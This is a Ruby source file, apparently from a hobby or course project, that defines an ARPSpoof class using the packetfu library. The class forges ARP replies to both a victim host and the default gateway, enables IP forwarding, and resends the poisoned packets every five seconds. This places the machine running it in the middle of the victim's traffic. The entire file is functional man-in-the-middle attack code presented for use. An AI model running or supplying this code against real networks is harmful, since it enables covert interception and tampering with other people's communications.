#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# ARP Spoofer Class
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'

class ARPSpoof
    
    #---------------------------------------------------------------------------
    # initialize
    #
    # Initialization of the ARP Spoofer class.
    #
    # victim_ip - Victim's IP Address
    # victim_mac - Victim's MAC Address
    # opcode - ARP Opcode (default = 2)
    # iface - NIC Device (default = "em1")
    # spoof - true to start spoofing, false to not start (default = false)
    #
    # Revisions: (Date and Description)
    # 
    # October 26, 2012
    # Revised argument list to victim_ip, victim mac, gateway, iface, opcode
    # and spoof
    #
    # Added a spoof if statement. If spoof is true, start ARP Poisoning.
    #
    # Notes:
    #---------------------------------------------------------------------------
    def initialize(victim_ip, victim_mac, 
                   gateway = `ip route show`.match(/default.*/)[0].match(/\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?/)[0], 
                   iface = "em1", opcode = 2, 
                   spoof = false)
                   
        cfg = PacketFu::Utils.whoami?(:iface => iface) 
        
        @victim_packet = PacketFu::ARPPacket.new
        @router_packet = PacketFu::ARPPacket.new
        @interface = iface
        @running = spoof

        @victim_packet.eth_saddr = cfg[:eth_saddr]
        @victim_packet.eth_daddr = victim_mac
        @victim_packet.eth_saddr_mac = cfg[:eth_saddr]
        @victim_packet.eth_daddr_mac = victim_mac
        @victim_packet.arp_saddr_ip = gateway
        @victim_packet.arp_daddr_ip = victim_ip
        @victim_packet.arp_opcode = opcode
        
        @router_packet.eth_saddr = cfg[:eth_saddr]
        @router_packet.eth_daddr = cfg[:eth_daddr]
        @router_packet.eth_saddr_mac = cfg[:eth_saddr]
        @router_packet.eth_daddr_mac = cfg[:eth_daddr]
        @router_packet.arp_saddr_ip = victim_ip
        @router_packet.arp_daddr_ip = gateway
        @router_packet.arp_opcode = opcode
        
        # Start spoofing if start is true
        if spoof then
            start
        end # if
        
    end # initialize
    
    #---------------------------------------------------------------------------
    # send
    #
    # Send ARP packets to the Victim
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def send
        @victim_packet.to_w(@interface)
        @router_packet.to_w(@interface)
    end # send
    
    #---------------------------------------------------------------------------
    # start
    #
    # Start ARP poisoning to the target machine
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def start
        # Enable IP forwarding
        `echo 1 > /proc/sys/net/ipv4/ip_forward`
        while(@running)
            sleep 5
            send
        end # while
    end # start
    
    #---------------------------------------------------------------------------
    # send
    #
    # Stop ARP poisoning
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def stop
        `echo 0 > /proc/sys/net/ipv4/ip_forward`
        @running = false
    end # stop
end
